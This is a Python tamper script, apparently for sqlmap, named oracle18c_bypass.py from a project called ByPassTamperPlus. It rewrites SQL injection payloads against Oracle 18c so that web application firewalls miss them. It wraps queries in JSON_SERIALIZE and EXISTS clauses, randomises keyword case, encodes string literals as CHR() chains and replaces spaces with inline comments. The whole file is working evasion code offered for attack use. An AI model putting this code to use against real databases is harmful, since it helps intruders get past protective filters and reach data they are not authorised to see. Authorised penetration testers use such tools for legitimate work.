#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : oracle18c_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import random
import re

def general_obfuscate(payload):
    if not payload:
        return payload

    keywords = ["SELECT", "FROM", "WHERE", "UNION", "MATCH", "JSON_SERIALIZE", "DUAL"]
    for kw in keywords:
        payload = re.sub(r"\b%s\b" % kw, lambda m: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in m.group(0)), payload, flags=re.IGNORECASE)

    payload = re.sub(r"'([a-zA-Z0-9_/]+)'", lambda m: "||".join("CHR(%d)" % ord(c) for c in m.group(1)), payload)

    payload = re.sub(r"\s+", lambda m: random.choice(["\t", "/**/", "/*%s*/" % random.randint(100, 999)]), payload)

    payload = payload.replace(" AND ", " AND 1=1 AND ").replace(" OR ", " OR 0=0 OR ")

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "SELECT" in payload.upper() and "FROM DUAL" in payload.upper():
        match = re.search(r"SELECT\s+(.+?)\s+FROM\s+DUAL", payload, re.IGNORECASE)
        if match:
            inner = match.group(1)
            payload = payload.replace(match.group(0), "SELECT JSON_SERIALIZE(JSON_OBJECT('data' VALUE (%s))) FROM DUAL" % inner)

    if "WHERE" in payload.upper():
        payload = re.sub(r"WHERE\s+(.+)", r"WHERE EXISTS (SELECT 1 FROM DUAL WHERE \1)", payload, flags=re.IGNORECASE)

    if "ALL_TABLES" in payload.upper():
        payload = payload.replace("ALL_TABLES", "(SELECT TABLE_NAME FROM ALL_TABLES WHERE ROWNUM <= 100)")

    return general_obfuscate(payload)
